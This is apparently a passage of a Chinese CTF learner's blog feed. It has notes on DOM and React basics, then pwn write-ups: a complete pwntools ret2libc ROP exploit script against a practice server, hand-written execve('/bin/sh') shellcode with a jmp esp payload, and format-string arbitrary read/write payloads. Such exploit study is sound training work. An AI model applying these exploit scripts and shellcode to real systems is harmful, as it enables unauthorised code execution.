class="hljs-built_in">getElementsByTagName</span>()方法**<br>该方法会选取所有该标签的<span class="hljs-selector-tag">HTML</span>元素<br></code></pre></td></tr></table></figure>document.getElementByTagName("p")<p>hello</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">**getElementsByClassName()方法**<br>### DOM修改<br>**修改HTML内容**<br></code></pre></td></tr></table></figure><script>document.getElementById("intro").innerHTML = "new words";</script><p id="intro"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**修改HTML样式**</span><br></code></pre></td></tr></table></figure><p id="p1">Hello</p><p id="p2">hello</p><script>document.getElementById("p2").style.color = "red";document.getElementById("p2").style.fontFamily = "Arial";document.getElementById("p2").style.fontSize = "700";</script><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**添加新的HTML元素**</span><br></code></pre></td></tr></table></figure><div id="div1"><p id="p1">p1</p><p id="p2">p2</p></div><script>var para = document.createElement("p");var node = document.createTextNode("new para");para.appendChild(node);var element = document.getElementById("div1");element.appendChild(para);</script><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">### DOM元素<br>**创建新的<span class="hljs-selector-tag">HTML</span>元素<span class="hljs-built_in">-createElement</span>()**<br>如上方代码一样<br>先创建，再添加到已有的元素上<br>**<span class="hljs-built_in">insertBefore</span>()方法**<br>可以在指定元素节点之前添加该元素<br></code></pre></td></tr></table></figure>insertBefore(src,des)<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">注意记得为各个节点命名，方便操作<br>**<span class="hljs-built_in">replaceChild</span>()方法**<br>替换目标元素<br></code></pre></td></tr></table></figure>replaceBefore(src,des);<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## React<br>### React部署<br>利用官方cdn链接<br></code></pre></td></tr></table></figure><script src="cdnurl"></script><script src="https://cdn.staticfile.org/react/16.4.0/umd/react.development.js"></script><script src="https://cdn.staticfile.org/react-dom/16.4.0/umd/react-dom.development.js"></script><script src="https://cdn.staticfile.org/babel-standalone/6.26.0/babel.min.js"></script><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel"><br>实例中我们引入了三个库： react.development.<span class="hljs-keyword">min</span>.js 、react-dom.development.<span class="hljs-keyword">min</span>.js 和 babel.<span class="hljs-keyword">min</span>.js：<br>**react.<span class="hljs-keyword">min</span>.js**是核心库<br>**react-dom.<span class="hljs-keyword">min</span>.js**提供与DOM相关的功能<br>**babel.<span class="hljs-keyword">min</span>.js**Babel可以将ES6代码转为ES5，提高兼容性<br>### React元素渲染<br>#### 将元素渲染到DOM中<br>传递给<span class="hljs-string">``</span><span class="hljs-string">`ReactDOM.render()`</span><span class="hljs-string">``</span><br></code></pre></td></tr></table></figure>const element = <h1>HEllo</h1>ReactDOM.render(    element,    document.getElementById('example'));即可将element内容传给example为id的元素<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### 更新元素渲染<br>因为React元素是不可变的，修改时，需要用新元素进行替换<br></code></pre></td></tr></table></figure>function tick(){    const element = (        <div>            <h1>现在是{new Date().toLocateTimeString()}.</h1>        </div>     );     ReactDOM.render(         element,         document.getElementById('example')         );}<p>setInterval(tick,1000);</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">每<span class="hljs-number">1000</span>ms替换一次，达到计时效果<br>### React JSX<br>JSX是一种语法<br>在react中代替常规的JavaScript<br>如<br></code></pre></td></tr></table></figure><p>const element = </p><h1>HEllo</h1>;<p></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">**注意**<br>由于JSX是Javascript语言，故一些标识符如<span class="hljs-keyword">class</span>最好用<span class="hljs-symbol">className</span>代替<br></code></pre></td></tr></table></figure><p>var myDivElement = <div classname="foo">;</div></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### 在JSX中插入JS表达式<br></code></pre></td></tr></table></figure><p>ReactDOM.render(<br>    <div><br>        <h1>{i == 1 ? ‘True!’ : “False!”}</h1><br>    </div><br>    ,<br>    document.getElementById(‘example’)<br>);<br>就是JS套HTML再套JS的感觉</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">### React组件<br></code></pre></td></tr></table></figure><p>function HellowMessage(props){<br>    return </p><h1>HElloe world</h1>;<br>}<p></p><p>const element = <HelloMessage>;</HelloMessage></p><p>ReactDOM.render(<br>    element<br>    ,<br>    document.getElementById(‘example’)<br>    );</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-strong">**第一步**</span><br>使用函数定义一个组件<br><br><span class="hljs-strong">**第二步**</span><br>用一个元素调用这个组件<br></code></pre></td></tr></table></figure><p>const element = <HelloMessage></HelloMessage></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">最后调用这个元素即可<br>#### 复合组件<br></code></pre></td></tr></table></figure><p>function Name(props) {<br>    return </p><h1>网站名称：{props.name}</h1>;<br>}<br>function Url(props) {<br>    return <h1>网站地址：{props.url}</h1>;<br>}<br>function Nickname(props) {<br>    return <h1>网站小名：{props.nickname}</h1>;<br>}<br>function App() {<br>    return (<br>    <div><br>        <Name name="菜鸟教程"><br>        <Url url="http://www.runoob.com"><br>        <Nickname nickname="Runoob"><br>    </Nickname></Url></Name></div><br>    );<br>}<p></p><p>ReactDOM.render(<br>     <App>,<br>    document.getElementById(‘example’)<br>);</App></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">可以看出，用props.name时，传递参数要写，name =  <span class="hljs-string">&quot;...&quot;</span><br>### React State（状态）<br>#### 将生命周期方法添加到类中<br>如<br>每当Clock组件第一次加载到 DOM 中的时候，我们都想生成定时器，这在 React 中被称为挂载。<br><br>同样，每当 Clock 生成的这个 DOM 被移除的时候，我们也会想要清除定时器，这在 React 中被称为卸载。<br></code></pre></td></tr></table></figure><p>class Clock extends React.Component {<br>  constructor(props) {<br>    super(props);<br>    this.state = {date: new Date()};<br>  }</p><p>  componentDidMount() {<br>    this.timerID = setInterval(<br>      () =&gt; this.tick(),<br>      1000<br>    );<br>  }</p><p>  componentWillUnmount() {<br>    clearInterval(this.timerID);<br>  }</p><p>  tick() {<br>    this.setState({<br>      date: new Date()<br>    });<br>  }</p><p>  render() {<br>    return (<br>      <div><br>        <h1>Hello, world!</h1><br>        <h2>现在是 {this.state.date.toLocaleTimeString()}.</h2><br>      </div><br>    );<br>  }<br>}</p><p>ReactDOM.render(<br>  <Clock>,<br>  document.getElementById(‘example’)<br>);</Clock></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pf">componentDidMount() 与 componentWillUnmount() 方法被称作生命周期钩子。<br><br>在组件输出到 DOM 后会执行 componentDidMount() 钩子，我们就可以在这个钩子上设置一个定时器。<br><br>this.timerID 为定时器的 ID，我们可以在 componentWillUnmount() 钩子中卸载定时器。代码执行顺序：<br><br>当 <span class="hljs-variable">&lt;Clock /&gt;</span> 被传递给 ReactDOM.render() 时，React 调用 Clock 组件的构造函数。 由于 Clock 需要显示当前时间，所以使用包含当前时间的对象来初始化 this.<span class="hljs-keyword">state</span> 。 我们稍后会更新此状态。<br><br>React 然后调用 Clock 组件的 render() 方法。这是 React 了解屏幕上应该显示什么内容，然后 React 更新 DOM 以匹配 Clock 的渲染输出。<br><br>当 Clock 的输出插入到 DOM 中时，React 调用 componentDidMount() 生命周期钩子。 在其中，Clock 组件要求浏览器设置一个定时器，每秒钟调用一次 tick()。<br><br>浏览器每秒钟调用 tick() 方法。 在其中，Clock 组件通过使用包含当前时间的对象调用 <span class="hljs-built_in">set</span>State() 来调度UI更新。 通过调用 <span class="hljs-built_in">set</span>State() ，React 知道状态已经改变，并再次调用 render() 方法来确定屏幕上应当显示什么。 这一次，render() 方法中的 this.<span class="hljs-keyword">state</span>.date 将不同，所以渲染输出将包含更新的时间，并相应地更新 DOM。<br><br>一旦 Clock 组件被从 DOM 中移除，React 会调用 componentWillUnmount() 这个钩子函数，定时器也就会被清除。<br><span class="hljs-comment">### React Props</span><br>props用于传递数据<br></code></pre></td></tr></table></figure><p>function HelloMe(props){<br>    return </p><h1>Hello {props.name}!</h1><br>}<p></p><p>const element= <HelloMe name="kasw">;</HelloMe></p><p>ReactDOM.render(<br>    element,<br>    document.getElementById(‘example’)<br>);</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### React 事件处理<br>HTML事件处理：<br></code></pre></td></tr></table></figure><button onclick="activateLasers()">激活按钮</button><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">React:</span><br></code></pre></td></tr></table></figure><button onclick="{activateLasers}">激活按钮</button><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">react中使用驼峰写法，且传入的是函数，而不是字符串<br>### React 条件渲染<br>登录界面判断<br>是输出**欢迎回来**<br>还是**请先注册**<br></code></pre></td></tr></table></figure>function UserGreeting(props) {  return <h1>欢迎回来!</h1>;}<p>function GuestGreeting(props) {<br>  return </p><h1>请先注册。</h1>;<br>}<br>function Greeting(props) {<br>  const isLoggedIn = props.isLoggedIn;<br>  if (isLoggedIn) {<br>    return <UserGreeting>;<br>  }<br>  return <GuestGreeting>;<br>}<p></p><p>ReactDOM.render(<br>  // 尝试修改 isLoggedIn={true}:<br>  <Greeting isloggedin="{false}">,<br>  document.getElementById(‘example’)<br>);<br>```</Greeting></p></GuestGreeting></UserGreeting></some-HTML-element>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>泄露出来的地址的处理</title>
    <link href="/2022/05/30/%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9C%B0%E5%9D%80%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <url>/2022/05/30/%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9C%B0%E5%9D%80%E7%9A%84%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="一道简单的ROP题"><a href="#一道简单的ROP题" class="headerlink" title="一道简单的ROP题"></a>一道简单的ROP题</h1><h2 id="但是不是那么简单"><a href="#但是不是那么简单" class="headerlink" title="但是不是那么简单"></a>但是不是那么简单</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><pre><code class="hljs python3">from pwn import*<br>from LibcSearcher import*<br>p = remote(&#x27;node4.buuoj.cn&#x27;,28006)<br>#p = process(&#x27;./rop&#x27;)<br>elf = ELF(&#x27;./rop&#x27;)<br>put_plt_addr = elf.plt[&#x27;puts&#x27;]<br>put_got_addr = elf.got[&#x27;puts&#x27;]<br>vuln = 0x4006ad<br>pop_rdi = 0x400733<br><br><br>payload1 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(put_got_addr) + p64(put_plt_addr) + p64(vuln)<br><br>p.recvuntil(&#x27;story!\n&#x27;)<br>p.sendline(payload1)<br><br>put_got = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>print(hex(put_got))<br>libc = LibcSearcher(&#x27;puts&#x27;,put_got)<br>libc_base = put_got - libc.dump(&#x27;puts&#x27;)<br>sys = libc_base + libc.dump(&#x27;system&#x27;)<br>binsh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br><br>payload2 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(binsh) + p64(sys)<br>p.recv()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>接收返回的got地址时，使用</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recv</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,&#x27;\x00&#x27;)<br># or<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvline</span>()<span class="hljs-selector-class">.strip</span>()<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,&#x27;\x00&#x27;)<br></code></pre></td></tr></table></figure><p>是正确的<br>这样可以正确地补上两位\x00<br>而其他方法，保留\n的都是错误的，会导致地址错误！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2022/05/28/shellcode/"/>
    <url>/2022/05/28/shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="shellcode的利用"><a href="#shellcode的利用" class="headerlink" title="shellcode的利用"></a>shellcode的利用</h1><p>以国赛提前一天放出的模拟题为例<br>本文基于32位系统<br>打开题目后可以发现一下基础信息</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs mipsasm">没有开任何防护<br>没有开NX保护，意味着第一时间可以想到，把<span class="hljs-keyword">shellcode放在栈上运行</span><br><span class="hljs-keyword"></span>是<span class="hljs-number">32</span>位程序<br></code></pre></td></tr></table></figure><h2 id="shellcode-生成方法"><a href="#shellcode-生成方法" class="headerlink" title="shellcode 生成方法"></a>shellcode 生成方法</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)</span></span><br>shellcode = <span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.sh</span>())<br></code></pre></td></tr></table></figure><p>这样就可以生成一个shellcode<br><strong>注意：这样生成的shellcode长度为44，如果超过可以收容的大小，可能需要用其他方法编写shellcode</strong><br>以下为手动生成shellcode方法，大小为23，很小。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>             #<span class="hljs-built_in">eax</span>置<span class="hljs-number">0</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span>#<span class="hljs-built_in">edx</span>置<span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>#将<span class="hljs-number">0</span>入栈，标记了”/bin/sh”的结尾<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x68732f2f</span>         #传递”/sh”，为了<span class="hljs-number">4</span>字节对齐，使用//sh，这在execve()中等同于/sh<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x6e69622f</span>         #传递“/bin”<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">esp</span>             #此时<span class="hljs-built_in">esp</span>指向了”/bin/sh”,通过<span class="hljs-built_in">esp</span>将该字符串的值传递给<span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0xB</span>              #<span class="hljs-built_in">eax</span>置为execve函数的中断号<br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>                #调用软中断<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm（shellcode）<br></code></pre></td></tr></table></figure><p>关于int 0x80软中断</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">第一步，就是需要将系统调用号加入到<span class="hljs-built_in">eax</span>中。<br>第二步，<span class="hljs-built_in">ebx</span>保存函数调用的第一个参数，<span class="hljs-built_in">ecx</span>、<span class="hljs-built_in">edx</span>、<span class="hljs-built_in">esi</span>、<span class="hljs-built_in">edi</span>分别对应这<span class="hljs-number">2345</span>个参数。<br>如果参数超过<span class="hljs-number">5</span>个，就必须将参数数组存储在内存中，而且必须将该数组的地址放在<span class="hljs-built_in">ebx</span>中。<br>一旦加载寄存器后，就会调用<span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span> 汇编指令来中断，强迫内核暂停手头上的工作并处理该中断。<br></code></pre></td></tr></table></figure><h2 id="用ROPgadget获取jmp-esp地址"><a href="#用ROPgadget获取jmp-esp地址" class="headerlink" title="用ROPgadget获取jmp esp地址"></a>用ROPgadget获取jmp esp地址</h2><p>目的在于将返回值设置为jmp esp，可以返回esp然后执行传入的shellcode。</p><h2 id="最终的payload"><a href="#最终的payload" class="headerlink" title="最终的payload"></a>最终的payload</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">payload = shellcode.ljust(<span class="hljs-number">0x80</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(addr_jmp_esp) + asm(<span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">esp</span>,<span class="hljs-title">offset</span></span>;call esp)<br><span class="hljs-comment">#关于这个asm(...),是手动启用栈，offset值为前面覆盖的数据长度+4。</span><br></code></pre></td></tr></table></figure><p>如此就可以利用一个没有保护，但是也没有system()的程序。<br><strong>注意shellcode在发送时不用p32包装！！</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>国赛</title>
    <link href="/2022/05/23/%E5%9B%BD%E8%B5%9B/"/>
    <url>/2022/05/23/%E5%9B%BD%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-格式化字符串漏洞"><a href="#0x01-格式化字符串漏洞" class="headerlink" title="0x01 格式化字符串漏洞"></a>0x01 格式化字符串漏洞</h1><h2 id="漏洞的产生原因及利用原理"><a href="#漏洞的产生原因及利用原理" class="headerlink" title="漏洞的产生原因及利用原理"></a>漏洞的产生原因及利用原理</h2><p>我们在正常的对格式化字符输出时大都使用printf(*format,*arg);<br>此种形式进行输出，但是部分程序员在开发的使用，为了省事使用了，printf(*format);进行输出<br>错误：<br>#include &lt;stdio.h&gt;<br>void main(){<br>    char str[1024];<br>    scanf(%s,&amp;str);<br>    printf(%s);<br>}</p><p>正确：<br>#include &lt;stdio.h&gt;<br>void main(){<br>    char str[1024];<br>    scanf(%s,&amp;str);<br>    printf(%s,str);<br>}</p><p>出现字符串格式化漏洞时，有如下方法</p><h3 id="任意地址泄露（读）"><a href="#任意地址泄露（读）" class="headerlink" title="任意地址泄露（读）"></a>任意地址泄露（读）</h3><p>任意地址读需要用到printf的另外一个特性,$操作符.这个操作符可以输出指定位置的参数.利用%n$x这样的字符串就可以获得对应的第n+1个参数的数值(因为格式化参数里边的n指的是格式化字符串对应的第n个输出参数,那么相对于输出函数来说就成了第n+1个).<br>先输入若干个数据确定偏移，比如AAAA%6$x，若输出为AAAA41414141时，就是达到了偏移量，此时偏移为6，若改为AAAA%7$x，脚本写为</p><blockquote></blockquote><p>conn.sendline(“%7$s”+p32(0x08048000))</p><p>会打印处0x0804800地址前几字段。<br>原因如下：此脚本中将p32(0x08048000)率先压入栈中，当其格式化串超出偏移值1个位置时，会读取栈上此地址，然后进行打印，看如下栈图。<br><img src="/2022/05/23/%E5%9B%BD%E8%B5%9B/p1.jpg"></p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>利用%n的特性，可以将已打印字符数传给后续传入的地址<br>如：<br>printf(“%.100d%n”,c,&amp;c);<br>可以打印100个c，然后将100赋值到c的地址处。</p><p>总结一下<br>payload核心在于，先计算出偏移值，再利用%kc%m$n进行修改</p><h3 id="攻防世界题-string（新手区）"><a href="#攻防世界题-string（新手区）" class="headerlink" title="攻防世界题 string（新手区）"></a>攻防世界题 string（新手区）</h3><p>此题有几点需要注意，首先是这个样子的代码，是可以考虑传入shellcode直接执行</p><blockquote><p>((void (__fastcall*)(_QWORD))v1)(0LL)</p></blockquote><p>此行会将v1转化为代码执行，使用</p><figure class="highlight moonscript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>, <span class="hljs-built_in">os</span> = <span class="hljs-string">&#x27;linux&#x27;</span><br>shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>得到shellcode机器码。</p><p>再者就是灵活运用printf(format)这样的漏洞<br>如本题中，需要泄露v3的地址，且此地址就在漏洞printf不远处，就不要用AAAA-%p….的形式去泄露AAAA所存储的地址了，而是直接找v3对应内存的值，在输入%p….后对应偏移量为多少</p><h3 id="记录一个新方法"><a href="#记录一个新方法" class="headerlink" title="记录一个新方法"></a>记录一个新方法</h3><p>修改地址法<br>用到pwn里的fmtstr_payload(offset,{被替换的：替换为})<br>这个语法<br>如将atoi的got地址改为system的plt地址，可以写为<br>payload = fmtstr_payload(offset,{atoi_got : system_plt})即可利用格式化字符串修改地址</p><h1 id="0x02-ROP"><a href="#0x02-ROP" class="headerlink" title="0x02 ROP"></a>0x02 ROP</h1><h2 id="寄存器传参顺序"><a href="#寄存器传参顺序" class="headerlink" title="寄存器传参顺序"></a>寄存器传参顺序</h2><p>64位系统中，函数传参进入寄存器<br>而32位是先入栈再传入数据。<br>64位的传参顺序：前7个参数，从左至右依次传入rdi，rsi，rdx，rcx，r8，r9，r15.</p><h2 id="简单ROP"><a href="#简单ROP" class="headerlink" title="简单ROP"></a>简单ROP</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>若题目没给libc版本，需要用LibcSearch来做，其中格式为libc.dump(‘system’)<br>如果给了libc版本，可以这样<br>libc = ELF(‘./libc-2.xx.so’)这样子<br>搜索/bin/sh字符串所在位置时，有如下语法：<br>next(libc.search(b’/bin/sh’))可以获取binsh的地址</p><h3 id="关于strlen-检测的绕过"><a href="#关于strlen-检测的绕过" class="headerlink" title="关于strlen()检测的绕过"></a>关于strlen()检测的绕过</h3><p>read函数读至’\n’结束<br>strlen读至’\x00’结束<br>在32位里面，char数组读入时：read(0,buf,10u)，就读入十个char，而’\x00’是一个char<br>故遇到检查strlen来进行阻碍时，可以在字符串前面输入’\x00’开头，来规避之。</p><h3 id="关于构造好ROP以后，接收got表地址时的注意事项"><a href="#关于构造好ROP以后，接收got表地址时的注意事项" class="headerlink" title="关于构造好ROP以后，接收got表地址时的注意事项"></a>关于构造好ROP以后，接收got表地址时的注意事项</h3><p>1.32位系统下，got表地址是4byte，用p.recv(4);u32(write)来收取<br>2.64位系统下，got表地址位8byte，需要进行相当的调整。</p><h1 id="0x03-堆heap"><a href="#0x03-堆heap" class="headerlink" title="0x03 堆heap"></a>0x03 堆heap</h1><p>引用经典内存布局</p><p><img src="/2022/05/23/%E5%9B%BD%E8%B5%9B/p2.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>basic usage of libc</title>
    <link href="/2022/03/22/basic-usage-of-libc/"/>
    <url>/2022/03/22/basic-usage-of-libc/</url>
    
    <content type="html"><![CDATA[<h1 id="libc的基本用法"><a href="#libc的基本用法" class="headerlink" title="libc的基本用法"></a>libc的基本用法</h1><h2 id="题目来源：XCTF-PWN-新手区-level3"><a href="#题目来源：XCTF-PWN-新手区-level3" class="headerlink" title="题目来源：XCTF-PWN-新手区-level3"></a>题目来源：XCTF-PWN-新手区-level3</h2><h2 id="0下"><a href="#0下" class="headerlink" title="0下"></a>0下</h2><h2 id="0x1-基本分析"><a href="#0x1-基本分析" class="headerlink" title="0x1 基本分析"></a>0x1 基本分析</h2><p>32-bit elf文件</p><p>NX保护开启</p><p>32位IDA下，仅有一个read溢出点</p><p>栈溢出方式获取system权限</p><h2 id="0x2-找到突破口"><a href="#0x2-找到突破口" class="headerlink" title="0x2 找到突破口"></a>0x2 找到突破口</h2><p>没有任何后门函数，没有调用system函数<br><br>但是题目给出了libc_32.so.6文件<br><br>思路如下：<br><strong>利用题目中调用的write函数，打印自身got表地址，通过write函数与libc基址的offset值，获得libc基址，从而调用libc中的内容（libc中既有system函数又有/bin/sh字符串）</strong></p><p>构建exp脚本如下：<br><img src="/2022/03/22/basic-usage-of-libc/p1.png" alt="exp脚本"></p><ol><li>完成136大小的buf字符串数组溢出和32位下saved_register  ebp的溢出</li><li>用write函数地址覆盖返回地址，以调用write函数。</li><li>布置栈帧，此处覆盖意义为，write函数的返回地址，覆盖为main函数地址，准备第二次溢出。</li><li>布置栈帧，write函数的参数。（通过此处获取got地址）</li></ol><p><br>\</p><p>第二次溢出，覆盖后调用system(“/bin/sh”)<br>完成本题。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><ol><li>用elf = ELF(“./file”)的形式调用文件内，自有的函数的plt、got地址。</li><li>32位的题，用布置栈帧方法。</li><li>打印出来的got地址，用u32方法解码后，是该函数在libc中的真实地址。</li><li>用libc.symbols[“func”]的方法获取函数func相对基址的offset。</li><li>二次溢出，达到一次拿地址，二次打通的效果。</li><li>教科书式的题值得多次揣摩！</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>create /bin/sh</title>
    <link href="/2022/03/20/create-bin-sh/"/>
    <url>/2022/03/20/create-bin-sh/</url>
    
